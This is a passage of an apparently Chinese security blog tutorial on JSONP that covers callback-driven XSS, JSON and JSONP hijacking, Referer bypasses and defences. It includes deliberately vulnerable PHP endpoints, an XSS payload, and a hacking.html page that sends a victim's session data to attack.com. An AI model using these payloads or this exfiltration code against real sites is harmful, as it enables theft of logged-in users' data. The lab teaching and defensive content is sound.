 </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;#here&#x27;</span>).<span class="title function_">html</span>(html); </span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax"></a>$.ajax</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span>    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    <span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;  <span class="comment">// 使用ajax来调用jsonp  $.ajax(&#123;  type: &quot;get&quot;, //jsonp默认为get请求，即使写post也会转换成get方式  async: false, // jsonp默认为false，即使写true也会转换成false  url: &quot;http://192.168.68.130/jsonp.php&quot;, // 服务端地址  // data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 入参  dataType: &quot;jsonp&quot;, // jsonp调用固定写法  jsonp: &quot;callback&quot;, // 传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)。即：?callback=xxx中的callback部分  // jsonpCallback:&quot;flightHandler&quot;,//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据。即：?callback=xxx中的xxx部分  success: function(data)&#123; // 调用成功之后的方法  var html = &#x27;&lt;ul&gt;&#x27;;for(var i = 0; i &lt; data.length; i++)&#123;    html += &#x27;&lt;li&gt;&#x27; + data[i] + &#x27;&lt;/li&gt;&#x27;;&#125;html += &#x27;&lt;/ul&gt;&#x27;;$(&#x27;#here&#x27;).html(html); &#125;,  error: function()&#123; // 调用失败之后的方法      alert(&#x27;error&#x27;);  &#125;  &#125;);  &#125;); </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="get"><a href="#get" class="headerlink" title="$.get"></a>$.get</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span>    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span>    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    <span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">get</span>(<span class="string">&#x27;http://192.168.68.130/jsonp.php?callback=?&#x27;</span>, <span class="keyword">function</span> (<span class="params">data</span>) &#123; <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++)&#123;html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;&#125;html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;$(<span class="string">&#x27;#here&#x27;</span>).<span class="title function_">html</span>(html);  &#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0X02-JSONP跨域漏洞"><a href="#0X02-JSONP跨域漏洞" class="headerlink" title="0X02 JSONP跨域漏洞"></a>0X02 JSONP跨域漏洞</h1><p>JSONP跨域漏洞主要是callback自定义导致的XSS和JSONP劫持。</p><h2 id="callback导致的自定义xss"><a href="#callback导致的自定义xss" class="headerlink" title="callback导致的自定义xss"></a>callback导致的自定义xss</h2><p>通过上面的了解，我们知道了在JSONP跨域中，我们是可以传入一个函数名的参数如callback，然后JSONP端点会根据我们的传参动态生成JSONP数据响应回来</p><p>如果JSONP端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的Content-Type、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p><h4 id="未设置Content-Type且未过滤"><a href="#未设置Content-Type且未过滤" class="headerlink" title="未设置Content-Type且未过滤"></a>未设置Content-Type且未过滤</h4><p>我们先看下默认情况下未设置Content-Type且未对callback参数进行过滤的场景，这种情形是最基础也是最常见的，网上大多数的JSONP引起的XSS都是这种场景的。</p><p>JSONP端点的代码如下，data.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>]))&#123;<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="keyword">print</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#123;&quot;username&quot; : &quot;h0ld1rs&quot;, &quot;password&quot; : &quot;thisispassword&quot;&#125;);&#x27;</span>;&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&#x27;No callback param.&#x27;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时，正常，我们会在页面返回jsonp数据</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207205455.png"></p><p>当输入XSS payload<code>callback=1&lt;script&gt;alert(&quot;hacked by Wum1ng&quot;)&lt;/script&gt;</code>时，会弹框，且可以看到响应报文在未设置Content-Type情况下其值为text&#x2F;html：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207205646.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207210128.png"></p><h3 id="对Content-Type设置探讨"><a href="#对Content-Type设置探讨" class="headerlink" title="对Content-Type设置探讨"></a>对Content-Type设置探讨</h3><h4 id="application-x2F-json"><a href="#application-x2F-json" class="headerlink" title="application&#x2F;json"></a>application&#x2F;json</h4><p>JSON文本的MIME媒体类型是application&#x2F;json，默认编码为UTF-8。同时这也是建议的JSONP端点设置的Content-Type值，用于防御XSS。</p><p>我们直接在前面data.php中添加设置Header字段的代码即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpheader(&#x27;Content-type<span class="punctuation">:</span> application/json&#x27;);if(isset($_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>))<span class="punctuation">&#123;</span>$callback = $_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>;print $callback.&#x27;(<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;thisispassword&quot;</span><span class="punctuation">&#125;</span>);&#x27;;<span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span>echo &#x27;No callback param.&#x27;;<span class="punctuation">&#125;</span>?&gt;</span><br></pre></td></tr></table></figure><p>此时无论正常访问还是注入XSS payload，页面都不会显示内容出来：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207210357.png"></p><p>但我们在浏览器查看原始数据的时候是有JSONP数据返回的，但就是不会在页面中解析该内容：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207211043.png"></p><p>这种情形，在哪个浏览器尝试都不会弹框，因为此时浏览器不再将响应返回内容当成HTML文档来解析了，而是将其视为JSON数据，但由于该数据是JSONP格式的而不是JSON格式的，当浏览器尝试解析JSON数据时会报错。然而这一切如果只是在几个文件或接口之间JSONP数据的调用，则是不会有问题的，因为它不需要浏览器显示出来而只是取其中的数据而已。</p><h4 id="text-x2F-json"><a href="#text-x2F-json" class="headerlink" title="text&#x2F;json"></a>text&#x2F;json</h4><p>text&#x2F;json是application&#x2F;json正式注册之前，JSON的实验版MIME类型。</p><p>将data.php中对应的字段值改为text&#x2F;json，再访问，可以看到页面原封不动地返回数据，但浏览器不会解析其中的内容，不会弹框：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpheader(&#x27;Content-type<span class="punctuation">:</span> text/json&#x27;);if(isset($_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>))<span class="punctuation">&#123;</span>$callback = $_GET<span class="punctuation">[</span>&#x27;callback&#x27;<span class="punctuation">]</span>;print $callback.&#x27;(<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;thisispassword&quot;</span><span class="punctuation">&#125;</span>);&#x27;;<span class="punctuation">&#125;</span> else <span class="punctuation">&#123;</span>echo &#x27;No callback param.&#x27;;<span class="punctuation">&#125;</span>?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207211753.png"></p><p>这种情形处理会将响应内容显示在页面上，但浏览器同样不会将该内容当成HTML文档来解析，同时也没有去按JSON格式解析内容，因此没有报错</p><h4 id="application-x2F-javascript与text-x2F-javascript"><a href="#application-x2F-javascript与text-x2F-javascript" class="headerlink" title="application&#x2F;javascript与text&#x2F;javascript"></a>application&#x2F;javascript与text&#x2F;javascript</h4><p>其实，JSONP格式的数据就是JS数据，其返回的内容就是传入参数的JS函数的调用。</p><p>application&#x2F;javascript是JavaScript的正式注册的MIME媒体类型。</p><p>因此，可能会有些程序员在设置Content-Type时，会将其设置为application&#x2F;javascript，将响应的JSONP内容正确地设置为JS类型。</p><p>我们修改data.php中对应的Content-Type值为application&#x2F;javascript再看看，在Chrome和Firefox下确实没有弹框：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207212132.png"></p><p>但是换到非最新版的IE就会弹了，&#x3D;&#x3D;本地IE更新到最新的只是提示是否下载该文件而已。&#x3D;&#x3D;</p><p>另外，text&#x2F;javascript的效果是一样的，其是application&#x2F;javascript的测试版。</p><h4 id="X-Content-Type-Options"><a href="#X-Content-Type-Options" class="headerlink" title="X-Content-Type-Options"></a>X-Content-Type-Options</h4><p>如果在响应报文中X-Content-Type-Options字段被设置为nosniff，Content-Type必须设置为JavaScript（application&#x2F;javascript或text&#x2F;javascript）才能在浏览器中运行。</p><p>这是因为在响应中包含回调产生的问题，这时响应不再解析JSON而是解析JS。</p><h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>JSONP劫持其实和CSRF的攻击是类似的，只不过CSRF是提交表单请求，而JSONP劫持是将请求JSONP端点获取到的JSONP数据发往攻击者服务器中、实现获取JSONP敏感信息。</p><p>因此，JSONP劫持的前提和CSRF是一样的，当服务端没有校验请求来源，如未严格校验Referer或未存在token机制等，都会导致JSONP劫持的产生。</p><p>我们经常会听到JSON劫持和JSONP劫持，两者有啥区别，下面简单说下。<br>&#x3D;&#x3D;简单地说，JSONP劫持属于JSON劫持的一种&#x3D;&#x3D;</p><h4 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h4><p>JSON劫持即JSON Hijacking，攻击过程类似CSRF，区别在于CSRF只管发送表单请求，但是JSON劫持则是获取JSON格式的敏感数据。</p><p>通常，有些Web应用会把一些敏感数据以JSON形式返回到前端，如果仅仅通过cookie来判断请求是否合法，那么就可以利用类似CSRF的手段，向目标服务器发送请求，以获得敏感数据。</p><p>当JSON数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将JSON数据发送给第三方即攻击者的代码。</p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>比如目标站点存在可直接访问JSON数据，其可通过GET请求如<code>www.good.com/user/mail.json</code>来进行访问，同时这个请求没有对用户的身份进行严格的认证，那么当用户访问一个恶意站点的时候，恶意站点同样包含获取<code>www.good.com/user/mail.json</code>的GET请求，再通过JSON劫持的方式就可以获取到用户的敏感JSON数据，然后发送到恶意的站点。</p><p><img src="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png" alt="img"></p><p>关键的步骤是第4步和第7步。当用户访问恶意站点之后，从正常站点将JSON数据下载下来之后，如何发送到恶意站点上去。</p><p>这里，我们的恶意页面仅仅是通过script标签的src属性进行导入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;www.good.com/data.json&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>新建data.json文件如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fname&quot;</span><span class="punctuation">:</span><span class="string">&quot;h0ld1rs&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lname&quot;</span><span class="punctuation">:</span><span class="string">&quot;yanmie&quot;</span><span class="punctuation">,</span><span class="attr">&quot;phone&quot;</span><span class="punctuation">:</span><span class="string">&quot;666666&quot;</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;Wum1ng@163.com&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，就会导致请求目标敏感JSON文件。</p><p>JSON数据从服务器端到达浏览器之后，会被浏览器解析为JavaScript中的Object的实例。在这种情况下，只要重写Object类的set方法，就可以获取到想要的数据，这就是JSON劫持的实现，以下就是攻击代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;email&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="comment">// send data to www.bad.com        senddata2badsute(obj)    &#125;&#125;);&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;www.good.com/data.json&quot;/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>我们为Object类的email属性设置一个Hook函数。在JavaScript中所有的类都是继承至Object类，所以defineProperty()这个方法为所有的对象的email属性都增加了一个Hook函数。当有对象设置email属性的时候，就会运行上面这段代码。所以当浏览器获取到了json数据，要将json数据转化为JavaScript对象的时候，由于json数据中存在email属性的设置，此时就会触发Hook函数，而这个函数就会将数据传送到攻击者。这个过程就完成了json数据的劫持了。</p><p>PS:目前网络上关于这方面的资料大部分都是2012年之前的，此时尝试进行重新的时候，发现已经无法实现了。<strong>说明浏览器目前已经修复了这个漏洞</strong>。关于hook对象的属性设置目前的实现方法与之前的方法也相同了。</p></blockquote><p>我们本地试下就知道了，当我们通过.属性的方式赋值时是会弹框的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;Id&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="title function_">alert</span>(obj);    &#125;&#125;);&lt;<span class="regexp">/script&gt;&lt;script&gt;var a = new Object();a.Id = 666;&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207213324.png"></p><p>但是如果我们是直接声明并且赋值给一个对象，这个时候就不会触发这个事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;<span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>,<span class="string">&quot;Id&quot;</span>,&#123;    <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">obj</span>) &#123;        <span class="title function_">alert</span>(obj);    &#125;&#125;);&lt;<span class="regexp">/script&gt;&lt;script&gt;var b=&#123;&quot;Id&quot;:123&#125;;&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>(，，因为没反应，所以就不截图了)</p><p>而由目标JSON端点返回的数据都是{‘a’:’b’}的形式，&#x3D;&#x3D;即我们恶意页面接收到JSON数据时在script标签是通过直接声明并且赋值的形式来赋值给对象的，从而也不会导致弹框。换句话说，就是现在的浏览器已经对这种JSON劫持漏洞进行了防御，我们没有办法通过Hook JS函数来实现JSON劫持了。&#x3D;&#x3D;</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>当用户在已登录目标站点并保持着Cookie有效的情况下，被诱使访问了我们的恶意页面，而恶意页面是向目标JSON文件发起请求并获取响应；</p><p>因为script标签会自动解析请求回来的JSON数据并生成对应的JS对象，此时我们只需要再通过<code>Object.prototype.__defineSetter__</code>这个函数来进行Hook，就能实现将获取到的JSON数据往外发送给攻击者，从而成功导致JSON劫持；</p><p>但是该函数在当前的新版本chrome和firefox中都已经失效了，浏览器早已对此JSON劫持漏洞进行了修补</p><h4 id="JSONP劫持-1"><a href="#JSONP劫持-1" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h4><p>前面JSON劫持的通用方法其实已经早已被浏览器防御住了，但由于JSONP的出现，导致JSON劫持多了一种JSONP的形式，这是因为JSONP数据其实就是往JS函数中传参进行调用，这就导致了攻击者在恶意页面编写恶意的JS函数，通过JSONP的调用来执行该恶意JS函数、将敏感JSONP数据发往攻击者服务器中。</p><h5 id="Demo0"><a href="#Demo0" class="headerlink" title="Demo0"></a>Demo0</h5><p>这里我们模拟一个登录站点，登录后可与JSONP端点交互获取用户信息；而攻击者则是在自己服务器放置恶意HTML文件来尝试劫持用户JSONP数据。</p><p>main.php，放置于目标站点，用于用户登录以及与JSONP端点交互获取用户信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="title function_ invoke__">session_start</span>();<span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;admin&#x27;</span> || <span class="variable">$name</span>===<span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$pwd</span> === <span class="string">&#x27;guest&#x27;</span>)&#123;<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;&#125;<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;<span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);&#125;&#125;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://192.168.68.130/info.php?callback=jsonp&quot;&gt;用户信息&lt;/a&gt;&lt;br&gt;&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://192.168.68.130/main.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br data-tomark-pass&gt;&#x27;</span>;<span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;登录&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;main.php&quot; method=&quot;get&quot;&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;密码：&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;login&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;欢迎您, &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br data-tomark-pass&gt;&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>info.php，放置于目标服务器中，JSONP端点，用于提供指定用户的信息，注意这里设置了Content-Type为application&#x2F;json，防御了JSONP XSS漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">session_start</span>();<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:1,&#x27;name&#x27;:&#x27;admin&#x27;&#125;)&quot;</span>;&#125; <span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;guest&#x27;</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&#123;&#x27;id&#x27;:2,&#x27;name&#x27;:&#x27;guest&#x27;&#125;)&quot;</span>;&#125; <span class="keyword">else</span> &#123;        <span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;获取个人信息失败&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hacking.html，放置在攻击者服务器中，用于诱使受害者访问，以窃取目标站点JSONP端点的敏感信息并发往攻击者服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>lol<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;<span class="title function_">alert</span>(<span class="string">&quot;JSONP hacking&quot;</span>);<span class="keyword">var</span> h = <span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;<span class="keyword">var</span> a = <span class="string">&#x27;&#x27;</span>;a = key + <span class="string">&#x27; : &#x27;</span> + v[key] + <span class="string">&#x27; ,&#x27;</span>;h += a;&#125;<span class="title function_">alert</span>(h);$.<span class="title function_">get</span>(<span class="string">&#x27;http://attack.com/index.html?value=&#x27;</span>+h);&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.68.130/info.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者还是可以收到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215734.png"></p><p>这是发送方的</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215847.png"></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207215927.png"></p><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><ul><li><h4 id="Referer绕过"><a href="#Referer绕过" class="headerlink" title="Referer绕过"></a>Referer绕过</h4><p>有时候程序对Referer进行了校验，但并未对空Referer进行校验，此时我们就可以使用置空的Referer请求来绕过。    </p><ul><li>实现空refer有三种方法</li><li>使用iframe标签+javascript伪协议</li><li>从HTTPS向HTTP发起请求</li><li>使用meta标签</li></ul></li><li><p><strong>使用iframe标签+javascript伪协议</strong></p><p>原理就是在恶意HTML中，给iframe标签的src属性赋值为javascript:&#x2F;&#x2F;伪协议内容，其中具体内容为和之前一样的定义两个script标签、一个定义callback函数具体操作、另一个则是通过script标签的src属性向目标JSONP端点发起跨域请求。</p></li></ul><h2 id="0x03防御"><a href="#0x03防御" class="headerlink" title="0x03防御"></a>0x03防御</h2><ul><li>若可行，则使用CORS替换JSONP实现跨域功能；</li><li>应用CSRF防御措施来调用JSON文件：限制Referer 、部署Token等；</li><li>严格设置Content-Type及编码（Content-Type: application&#x2F;json; charset&#x3D;utf-8 ）；</li><li>严格过滤 callback 函数名及JSON里数据的输出；</li><li>严格限制对JSONP输出callback函数名的长度（如防御Flash输出的方法）</li></ul><h2 id="0x04-实际应用场景"><a href="#0x04-实际应用场景" class="headerlink" title="0x04 实际应用场景"></a>0x04 实际应用场景</h2><p>这篇文章介绍了JSON Hijacking钓鱼</p><p><a href="https://www.freebuf.com/articles/web/194698.html">https://www.freebuf.com/articles/web/194698.html</a></p><p>所以，jsonp需要验证refer，我们平时挖洞的时候，只要满足这4点，（其实xray就可以挖了）</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207220824.png"></p><p>对于xray扫出来，可以自己再验证一下，或者自己手工挖掘。</p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 